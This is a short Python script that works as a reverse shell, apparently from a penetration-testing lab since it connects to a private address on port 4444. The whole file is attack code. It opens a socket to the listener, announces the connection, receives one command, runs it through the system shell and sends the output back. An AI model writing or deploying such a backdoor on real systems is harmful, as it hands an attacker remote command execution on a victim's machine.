#!/usr/bin/env python

import socket
import subprocess

def execute_sys_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.4", 4444))

# connection.send(b'\n[+] Connection established. \n')
output = "\n[+] Connection established\n"

connection.sendall(output.encode('utf-8'))

command = connection.recv(1024)
command_result = execute_sys_command(command.decode('utf-8'))
connection.send(command_result)

connection.close()
